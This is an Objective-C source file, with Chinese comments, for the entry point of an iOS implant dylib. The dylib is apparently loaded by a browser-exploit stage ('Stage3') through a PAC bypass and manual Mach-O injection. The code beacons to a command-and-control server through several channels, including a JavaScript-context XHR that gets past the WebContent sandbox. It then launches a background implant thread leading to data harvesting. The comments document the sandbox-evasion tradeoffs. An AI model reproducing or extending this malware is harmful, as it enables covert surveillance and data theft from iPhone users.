/*
 * Stage3_VariantB.js（Go 仓库内 PATCH）同步拉取 bootstrap.dylib 后，会解析 LC_SYMTAB，
 * 查找名为 "_process" 的导出符号，找不到则抛错 → C2 侧看到 coruna chain error。
 *
 * Stage3 使用的是手动 Mach-O 内存注入（不是 dlopen），因此
 * __attribute__((constructor)) 不会自动触发。
 * process() 必须是真正的入口点，负责启动后台植入线程。
 *
 * 执行顺序：
 *   Stage3 调用 _process (PAC-bypassed caller)
 *   → process() → coruna_constructor() → 后台线程 → implant_main()
 *   → ke_run() / hook_slot 等待 → harvest_all()
 */

#include "c2.h"

#import <Foundation/Foundation.h>

/* coruna_constructor / upload_beacon 定义在其他翻译单元，extern 跨 TU 调用 */
extern void coruna_constructor(void);
extern void upload_beacon(void);

/* ── dylib 主入口（由 Stage3 直接调用）────────────────────────────────────── */
/*
 * Stage3_VariantB.js 通过 PAC-bypassed caller 跳转到此符号。
 * 必须保持 default visibility，否则被 -fvisibility=hidden 剔出导出表，
 * Stage3 无法在 LC_SYMTAB 中找到 _process → 抛错 → 链失败。
 *
 * 执行顺序：
 *   1. upload_beacon()      — 三通道诊断探针：
 *
 *        Channel C（JSContext / VM TLS 注入）
 *          process() 在 Stage3 .Pt() 返回栈上执行；+[JSContext currentContext]
 *          可能为 nil，但 JSGlobalContextGetCurrent 仍常指向页面 VM（与同步 XHR
 *          GET bootstrap.dylib 同源）。注入脚本对 C2_UPLOAD 做同源相对 POST。
 *          日志中描述含 "(jsc)" → Channel C 成功。
 *          同时保存 JSContext 强引用，供后台 implant 线程 dispatch_async 复用。
 *
 *        Channel B（raw socket + SecureTransport）[iOS 16+ WebContent: EPERM]
 *          非 WebContent 环境（如 syslogd 持久化后）可用。
 *          在 WebContent 内 socket() → EPERM，立即失败。
 *
 *        Channel A（NSURLSession）[WebContent 内被沙盒拒绝]
 *          兜底，仅在 Channel B 也不可用时才尝试。
 *
 *        Channel D（内存队列 → 可选 Stage3 中继）
 *          当 C/B/A 均失败时，upload_beacon() 将 JSON 写入导出全局变量
 *          g_cru_q_cnt / g_cru_q[]（见 include/cru_queue.h）。
 *          仅当 Stage3 侧实现读取并发起网络请求时才会排空；当前策略以 Channel C 为主。
 *
 *   2. coruna_constructor() — 启动后台 implant 线程（dispatch_once 保证单次）。
 *                             线程首行同样上报（描述含"(jsc)"或无后缀区分通道）。
 *
 * upload_beacon() 在 Channel C 走同步 XHR，耗时约一次 RTT；失败则回落 B/A。
 * 仅 Channel D 写队列也 <1 ms（内存 memcpy）；若无中继实现则队列不排空。
 */
__attribute__((visibility("default")))
void process(void) {
    /* Proof _process ran (no JS / network): survives if upload_beacon dies. */
    @autoreleasepool {
        NSUserDefaults *d = [NSUserDefaults standardUserDefaults];
        NSString *mark = [NSString stringWithFormat:@"v%s t=%.3f",
                          PAYLOAD_VERSION, [[NSDate date] timeIntervalSince1970]];
        [d setObject:mark forKey:@"__cru_proc_enter"];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
        [d synchronize];
#pragma clang diagnostic pop
    }
    upload_beacon();      /* 诊断层 1：同步上报，确认 C2 可达（Channel C/B/A） */
    coruna_constructor(); /* 诊断层 2：线程启动后第一行也会上报               */
}
